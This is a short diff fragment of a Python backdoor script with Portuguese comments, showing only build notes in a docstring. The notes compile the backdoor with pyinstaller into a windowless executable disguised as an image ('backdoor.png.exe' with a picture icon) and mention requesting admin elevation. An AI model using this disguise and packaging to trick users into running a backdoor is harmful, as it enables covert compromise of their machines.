@@ -18,15 +18,12 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
 
 ''' COMPILAR O BACKDOOR
  pyinstaller -F --clean -w backdoor.py -i icone.png -n backdoor.png.exe
+
  testar ->
 --uac-admin           Using this option creates a Manifest which will
                         request elevation upon application restart.
   --uac-uiaccess        Using this option allows an elevated application to
                         work with Remote Desktop.
-
-
-
-
 '''
 
 def run(comando): # funcão que vai ser executada por uma thread
